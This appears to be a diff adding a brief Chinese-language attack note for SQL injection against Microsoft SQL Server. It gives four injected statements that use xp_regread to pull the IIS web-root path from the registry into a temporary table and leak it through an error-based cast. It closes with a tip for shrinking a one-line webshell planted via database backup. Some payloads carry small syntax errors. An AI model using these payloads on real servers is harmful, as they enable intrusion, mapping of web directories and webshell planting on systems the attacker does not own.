@@ -1,0 +1,14 @@
+1、drop table [jm_tmp];create table [jm_tmp](value navrchar(4000) null,data nvarchar(4000) null)-- 创建表
+
+
+　　2、 delete [jm_tmp];insert [jm_tmp] exec master.dbo.xp_regread ’HKEY_LOCAL_MACHINE’,’SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots’,’/’-- 将网站目录插到表字段中
+
+
+　　3、and (select top 1 cast([data] as nvarchar(4000) char(124) from [jm_tmp] order by [data] desc)=0 ’//暴出字段
+
+
+　　4、drop table [jm_tmp]-- 删除此表。
+
+
+另附上备分专用一句话
+　　加个response.end会有不一样的效果,也就是插入一句话后所有的代码都无效,在一句话这里打止,也就减小了webshell的大小.
